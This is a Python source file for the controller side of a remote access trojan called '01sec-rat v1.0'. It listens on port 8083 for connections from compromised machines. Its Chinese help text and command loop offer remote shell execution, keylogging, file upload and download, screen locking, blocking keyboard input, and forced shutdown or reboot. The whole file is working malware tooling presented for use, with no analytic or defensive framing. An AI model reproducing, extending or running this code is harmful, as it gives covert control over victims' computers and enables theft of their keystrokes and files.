import socket
import sys
import threading
import random
import time


__product__ = "主控端"
__banner__ = '''


 .d8888b.   d888   .d8888b.  8888888888 .d8888b.  
d88P  Y88b d8888  d88P  Y88b 888       d88P  Y88b 
888    888   888  Y88b.      888       888    888 
888    888   888   "Y888b.   8888888   888        
888    888   888      "Y88b. 888       888        
888    888   888        "888 888       888    888 
Y88b  d88P   888  Y88b  d88P 888       Y88b  d88P 
 "Y8888P"  8888888 "Y8888P"  8888888888 "Y8888P"  

        ..=[        01sec-rat       ]=..             
        ..=[          v1.0          ]=..                            

'''

__help__ = '''
    sid>>shutdown      - 20秒关闭远程计算机
    sid>>reboot        - 20秒重启远程计算机
    sid>>cancel        - 取消关闭远程计算机
    sid>>shell         - 执行命令            [示例: sid>>shell 01Sec->57->shell->whoami]
    sid>>keylogger     - 记录远程键盘输入并保存在log文件
    sid>>upload        - 上传到远程磁盘        [示例：sid>>upload C:\\1.txt C:\\1.txt] [本地路径:远程路径]
    sid>>download      - 下载远程资源         [示例：sid>>download C:\\1.txt C:\\1.txt] [远程路径:本地路径]
    sid>>lock          - 锁定远程计算机
    sid>>blockinput    - 禁止远程键盘输入
    sid>>input         - 允许远程键盘输入
    sid>>close         - 关闭远程客户端
    '''


conns = {}  # 连接数
localtime = time.strftime('%H:%M:%S', time.localtime(time.time()))  # 获取本地当前时间
lock = threading.Lock()  # 全局锁


def init_server(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("[+] 初始化套接字")
    try:
        s.bind((host, port))
    except socket.error as e:
        print("[!]", e)
        sys.exit()

    s.listen(50)
    print("[+] 主控端监听在%s:%d" % (host, port))
    print("[+] 当前时间为", localtime)
    return s


def clientthread(conn):
    session_id = random.randint(1, 100)
    conns[session_id] = conn
    conn.send(b"")

    while True:
        try:
            data = conn.recv(1024)
            cominfo = data.decode().split("@")
            print("[+] 主机名: %s 用户名: %s sid：%d" % (cominfo[0], cominfo[1], session_id))
        except ConnectionResetError:
            break
        if not data:
            break
        while True:
            try:
                recvcmd = conn.recv(8096)
                print("\n" + recvcmd.decode("gbk"))
            except ConnectionResetError:
                break

    print("\n" + "[!] 连接断开")
    conn.close()


def inputter():
    lock.acquire()
    while True:
        command = input("01Sec->")
        if ">>" in command:
            shell = command.split(">>", 3)
            sessionid = shell[0]
            conns[int(sessionid)].sendall(str.encode(shell[1]))
        elif "sessions" == command:
            print(conns)
        while "shell" in command:  # 执行命令
            cmd = command.split(">>", 3)
            cmd1 = input("01Sec->" + cmd[0] + "->" + cmd[1] + "->")
            if "exit" == cmd1:
                break
            else:
                conns[int(cmd[0])].sendall(str.encode("$" + cmd1))
                continue


if __name__ == '__main__':
    print(__banner__)
    print(__help__)
    s = init_server("0.0.0.0", 8083)
    while True:
        conn, addr = s.accept()
        print("[+] 一个新连接来自" + addr[0] + ":" + str(addr[1]))

        threading.Thread(target=clientthread, args=(conn,)).start()
        threading.Thread(target=inputter, args=()).start()
